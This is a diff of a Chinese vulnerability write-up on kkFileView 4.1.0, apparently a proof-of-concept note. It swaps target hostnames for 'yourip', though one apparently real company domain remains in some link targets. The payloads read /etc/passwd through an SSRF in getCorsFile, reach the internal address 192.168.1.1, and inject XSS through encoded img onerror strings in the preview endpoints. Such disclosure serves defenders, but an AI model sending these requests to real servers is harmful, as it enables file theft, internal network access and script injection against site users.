@@ -21,9 +21,9 @@ kkFileView 是使用 Spring Boot 搭建的文档在线预览解决方案，能�
 
 **漏洞证明**
 
-漏洞接口:[https://filepreview.xxxx.com/getCorsFile?urlPath=file:/](https://filepreview.zhongan.io/getCorsFile?urlPath=file:/)
+漏洞接口:[https://yourip/getCorsFile?urlPath=file:/](https://filepreview.zhongan.io/getCorsFile?urlPath=file:/)
 
- http://xxx.com//getCorsFile?urlPath=file:///etc/passwd
+ http://yourip//getCorsFile?urlPath=file:///etc/passwd
 
 
 
@@ -37,11 +37,11 @@ kkFileview =v4.1.0
 
 1、kkFileview的getCorsFile接口存在SSRF漏洞，并且可读取任意文件。
 
-[https://filepreview.xxxxx/getCorsFile?urlPath=file:///](https://filepreview.xxxxx/getCorsFile?urlPath=file:///)
+[https://yourip/getCorsFile?urlPath=file:///](https://yourip/getCorsFile?urlPath=file:///)
 
 2、通过该接口调用内网服务，并且进行访问，实现SSRF。
 
-[https://filepreview.xxxxxx.com/getCorsFile?urlPath=http://192.168.1.1/](https://filepreview.xxxxxx.com/getCorsFile?urlPath=http://192.168.1.1/)
+[https://yourip/getCorsFile?urlPath=http://192.168.1.1/](https://yourip/getCorsFile?urlPath=http://192.168.1.1/)
 
 可以进行base64编码
 
@@ -53,18 +53,18 @@ kkFileview =v4.1.0
 
 **漏洞证明**
 
-http://xxx.com/onlinePreview?url=%3Cimg%20src=x%20οnerrοr=alert(0)%3E
+http://yourip/onlinePreview?url=%3Cimg%20src=x%20οnerrοr=alert(0)%3E
 
 
 
-URL1：[http://xxx.com2/onlinePreview?url=aHR0cDovL3d3dy5iYWlkdS5jb20vdGVzdC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D](http://xxx.com/onlinePreview?url=aHR0cDovL3d3dy5iYWlkdS5jb20vdGVzdC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D)
+URL1：[http://yourip/onlinePreview?url=aHR0cDovL3d3dy5iYWlkdS5jb20vdGVzdC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D](http://yourip/onlinePreview?url=aHR0cDovL3d3dy5iYWlkdS5jb20vdGVzdC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D)
 
 经过base64加URL编码`http://www.baidu.com/test.txt"><img src=111 onerror=alert(1)>`
 
 
 
 
-URL2： [http://xxx.com/picturesPreview?urls=aHR0cDovL3d3dy5iYWlkdS5jb20vdGVzdC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D](URL2: http://xxx.com/picturesPreview?urls=aHR0cDovL3d3dy5iYWlkdS5jb20vdGVzdC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D
+URL2： [http://yourip/picturesPreview?urls=aHR0cDovL3d3dy5iYWlkdS5jb20vdGVzdC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D](URL2: http://yourip/picturesPreview?urls=aHR0cDovL3d3dy5iYWlkdS5jb20vdGVzdC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D
 
 poc同理
 
